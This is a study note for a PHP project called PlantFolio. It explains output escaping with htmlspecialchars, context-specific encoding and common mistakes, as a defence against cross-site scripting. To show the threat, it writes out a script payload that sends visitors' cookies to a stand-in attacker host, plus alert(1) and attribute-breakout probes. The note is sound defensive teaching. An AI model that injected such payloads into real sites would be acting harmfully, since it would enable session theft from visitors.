# 00.04 · Output Escaping in PHP

> [!info] [[00.00 Project Foundations|Lesson 0]] · Week 1 · Priority 🔴 Core
> **Parent concept:** [[13.07 Cross-Site Scripting (XSS)]], which explains the attack. This note covers the defence used in PlantFolio.
> **Used for:** every value printed on every page, through the helper `e()`.

## 1. Definition
> [!note] Output escaping
> **Output escaping** means converting characters that have a special meaning in HTML into harmless codes **at the moment a value is printed**, so the browser shows them as text and does not act on them.

## 2. Why it is used
PlantFolio prints text that members type: nicknames, bios, listing titles, messages. If someone names a plant

```text
<script>document.location='https://evil.example/?c='+document.cookie</script>
```
and the page prints it unchanged, every visitor's browser runs that script. This is **cross-site scripting**: [[13.07 Cross-Site Scripting (XSS)]]. Escaping turns the same text into something that is only displayed.

## 3. How it works
The project's helper:

```php
function e($value)
{
    return htmlspecialchars((string) $value, ENT_QUOTES, 'UTF-8');
}
```

`htmlspecialchars()` replaces five characters:

| Character | Becomes | Why it is dangerous unescaped |
|---|---|---|
| `&` | `&amp;` | Starts an entity code |
| `<` | `&lt;` | Starts a tag |
| `>` | `&gt;` | Ends a tag |
| `"` | `&quot;` | Ends an attribute value |
| `'` | `&#039;` | Ends an attribute value written with single quotes |

- **`ENT_QUOTES`** makes it convert both kinds of quote.
- **`'UTF-8'`** names the character set, so Sinhala, Tamil and emoji pass through correctly.
- **`(string)`** lets numbers and `null` through without a warning.

## 4. Example
```php
<?php $nickname = '<script>alert(1)</script>'; ?>

<h3><?= $nickname ?></h3>        <!-- WRONG: the browser runs the script -->
<h3><?= e($nickname) ?></h3>     <!-- RIGHT -->
```
What the second line sends:
```html
<h3>&lt;script&gt;alert(1)&lt;/script&gt;</h3>
```
The visitor sees the text `<script>alert(1)</script>` on the page, and nothing runs.

An attribute needs it too. A title of `" onmouseover="alert(1)` would otherwise escape from the attribute:
```php
<img src="<?= e(photo_url($plant['photo'])) ?>" alt="Photo of <?= e($plant['nickname']) ?>">
```

## 5. Escape for the place the value lands in
`e()` is right for HTML text and for **quoted** attribute values. Other places need a different treatment.

| Where the value goes | Use | Example |
|---|---|---|
| Between tags | `e()` | `<p><?= e($bio) ?></p>` |
| Inside a quoted attribute | `e()` | `value="<?= e($q) ?>"` |
| A value inside a URL's query string | `rawurlencode()`, then `e()` on the whole URL | `href="<?= e('explore.php?q=' . rawurlencode($q)) ?>"` |
| Inside a `<script>` block | `json_encode()` with the `JSON_HEX_*` flags | see below |
| A whole URL supplied by a user | Check that it starts with `http://` or `https://`, then `e()` | A link such as `javascript:alert(1)` is not stopped by `e()` |

```php
<script>
  const plant = <?= json_encode($plant, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) ?>;
</script>
```

## 6. Escape on output, store the original
- **Save** what the user typed, unchanged, in the database.
- **Escape** each time it is printed.

Escaping before saving is a common error. The stored value is then already damaged (`Tom &amp; Jerry`), shows wrongly anywhere that is not HTML, and gets escaped a second time on output.

## 7. When not to escape
Only when the value is HTML **that the project itself produced**:
```php
<?= icon('droplet') ?>
```
`icon()` returns the contents of the project's own SVG file, and its name is limited to letters, digits and hyphens. Escaping it would print the SVG code as visible text. This is the one exception in the codebase, and each new exception needs the same reasoning.

## 8. Common mistakes
- **Printing `$_GET` or `$_POST` directly.** `<?= $_GET['q'] ?>` is the classic hole.
- **Escaping only "user" data.** Mock data and database data are escaped too. The habit must not depend on where a value came from.
- **Unquoted attributes:** `<input value=<?= e($q) ?>>`. A space in the value ends the attribute. Always quote.
- **Double escaping:** `e(e($x))` prints `&amp;lt;`.
- **Escaping on input** and saving the result.
- **Relying on `strip_tags()`** as a security measure. It is not designed for that.
- **Thinking `e()` makes a URL safe.** It does not stop `javascript:` links.
- **Building HTML in JavaScript with `innerHTML`** from data. The same attack, on the client side. Use `textContent`: [[07.03 DOM Manipulation and Events]].
- **Forgetting `alt`, `title`, `placeholder` and `value`.** They are output too.

## 9. Exam and viva focus
- **What is XSS?** Injection of script into a page viewed by other users. **Stored vs reflected** XSS: saved in the database and shown to everyone vs bounced back from the request.
- **How is it prevented?** Escape output; validate input; a Content Security Policy as a second layer.
- **What does `htmlspecialchars()` do?** Name the characters it converts.
- **Why escape on output and not on input?**
- **Encoding vs validation vs sanitisation:** changing how a value is represented; checking it against rules; removing unwanted parts.
- **Viva:** "Why is mock data escaped?" · "Why is `icon()` printed without `e()`?" · "What would happen if a member named a plant `<b>Monty</b>`?"
